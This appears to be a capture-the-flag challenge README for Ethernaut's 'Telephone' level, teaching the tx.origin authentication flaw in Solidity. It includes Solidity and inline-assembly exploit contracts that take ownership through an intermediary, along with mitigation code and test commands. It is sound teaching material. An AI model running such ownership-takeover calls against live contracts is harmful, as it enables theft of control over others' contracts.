# Challenge 03: Telephone - tx.origin Attack

**Difficulty:** ⭐ Beginner  
**Author:** OpenZeppelin Ethernaut  
**Updated:** 2025-10-20 by @obingo31  
**Category:** Access Control, Authentication

## 🎯 Challenge Goal

Claim ownership of the Telephone contract by exploiting the `tx.origin` vulnerability.

## � Contract Overview

```solidity
contract Telephone {
    address public owner;

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {  // ❌ CRITICAL BUG!
            owner = _owner;
        }
    }
}
```

## �🔍 Vulnerability Overview

The **tx.origin vs msg.sender** vulnerability occurs when contracts use `tx.origin` for authentication instead of `msg.sender`. This creates a dangerous authentication bypass that can be exploited through contract intermediaries.

### What is tx.origin vs msg.sender?

- **`tx.origin`**: The original externally owned account (EOA) that initiated the transaction
- **`msg.sender`**: The immediate caller of the current function (can be EOA or contract)

When a user calls a contract, which then calls another contract:
```
User EOA → Contract A → Contract B
```
In Contract B:
- `tx.origin` = User EOA
- `msg.sender` = Contract A

## 📝 Vulnerable Contract

```solidity
function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {  // ❌ VULNERABLE CONDITION
        owner = _owner;
    }
}
```

### The Bug

The condition `tx.origin != msg.sender` is supposed to prevent direct calls, but it can be easily bypassed by calling through any intermediary contract.

## 💡 Attack Strategy

```
1. Deploy malicious contract (AttackContract)
2. User calls AttackContract.exploit()
3. AttackContract calls Telephone.changeOwner()
   ├─> tx.origin = User EOA
   ├─> msg.sender = AttackContract  
   ├─> tx.origin != msg.sender ✓ (condition passes!)
   └─> Ownership transferred to attacker
```

## 🔧 Exploit Implementation

### Standard Solidity Exploit

```solidity
contract TelephoneExploit {
    function exploit(address _newOwner) external {
        // When this contract calls Telephone:
        // tx.origin = msg.sender (the user)
        // msg.sender = address(this)
        // Condition passes: tx.origin != msg.sender
        ITelephone(target).changeOwner(_newOwner);
    }
}
```

### Pure Assembly Exploit

The assembly implementation demonstrates low-level EVM operations:

```solidity
function attack(address newOwner) external {
    assembly {
        // Function selector: keccak256("changeOwner(address)") = 0xa6f9dae1
        let ptr := mload(0x40)
        mstore(ptr, 0xa6f9dae100000000000000000000000000000000000000000000000000000000)
        mstore(add(ptr, 0x04), newOwner)
        
        let success := call(gas(), target, 0, ptr, 0x24, 0x00, 0x00)
        if iszero(success) { revert(0, 0) }
    }
}
```

## 🧨 Assembly Deep Dive

The `TelephoneAssemblyAttack` contract showcases several educational EVM concepts:

### Storage Layout
```solidity
// slot 0: owner
// slot 1: targetContract
```

### Function Selector Computation
```solidity
// Manual computation of changeOwner(address) selector
// keccak256("changeOwner(address)") = 0xa6f9dae1...
mstore(ptr, 0xa6f9dae100000000000000000000000000000000000000000000000000000000)
```

### Low-Level Contract Calls
```solidity
let success := call(
    gas(),      // Forward all gas
    target,     // Target contract
    0,          // No ETH sent
    ptr,        // Input data location
    0x24,       // Input size: 4 + 32 bytes
    0x00,       // Output location
    0x00        // Output size
)
```

### Event Emission in Assembly
```solidity
// Emit event with computed topic hash
mstore(0x00, target)
log1(0x00, 0x20, 0x55ffe1743a11276c05c071933b9c3311fd9bac876dbc4532cd2107f2aad5ef78)
```

## 🛡️ Mitigation

**Never use `tx.origin` for authentication!**

```solidity
// ❌ VULNERABLE
function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
        owner = _owner;
    }
}

// ✅ SECURE
function changeOwner(address _owner) public {
    require(msg.sender == owner, "Only owner can change ownership");
    owner = _owner;
}
```

## 🧪 Testing

```bash
# Run all tests
forge test --match-path "challenges/03-Telephone/test/*.t.sol" -vvvv

# Test specific exploit
forge test --match-test "testAssemblyAttackExploit" -vvvv

# Run with gas reporting
forge test --match-path "challenges/03-Telephone/test/*.t.sol" --gas-report

# Property-based fuzzing with Echidna (will find the vulnerability!)
make echidna-telephone-quick
```

## 🔬 Echidna Fuzzing Results

**Important Discovery:** Echidna CAN find this vulnerability! 

```bash
echidna_owner_unchanged: failed!💥  
# Echidna successfully exploits the tx.origin vulnerability
```

This demonstrates Echidna's sophisticated testing capabilities - it can create scenarios where `tx.origin != msg.sender` even through its multi-sender configuration, making it an excellent tool for finding authentication vulnerabilities.

## 🎓 Learning Objectives

After completing this challenge, you should understand:

1. **tx.origin vs msg.sender**: The critical difference and why tx.origin should never be used for authentication
2. **Contract Intermediaries**: How malicious contracts can act as proxies to bypass authentication
3. **EVM Assembly**: Low-level contract calls, function selectors, and storage operations
4. **Event Emission**: How to emit events from assembly code
5. **Security Best Practices**: Proper authentication patterns in smart contracts

## 🔗 Real-World Impact

This vulnerability has been exploited in several high-profile attacks:
- **Bancor (2018)**: Used tx.origin for admin functions
- **Various DeFi protocols**: Phishing attacks through malicious contract interactions

The fundamental issue is that `tx.origin` creates an implicit trust relationship between the original caller and all intermediary contracts in the call chain.

## 🚀 Advanced Exercises

1. **Multi-step Attack**: Create an exploit that changes ownership multiple times in a single transaction
2. **Phishing Simulation**: Build a realistic phishing scenario where users unknowingly authorize ownership changes
3. **Gas Optimization**: Optimize the assembly exploit for minimal gas usage
4. **Event Analysis**: Write a tool to detect tx.origin vulnerabilities by analyzing contract events

## 📚 Additional Resources

- [Solidity Documentation: tx.origin](https://docs.soliditylang.org/en/v0.8.17/security-considerations.html#tx-origin)
- [EVM Opcodes Reference](../../docs/evm-opcodes.md) 
- [ConsenSys Security Best Practices](https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/)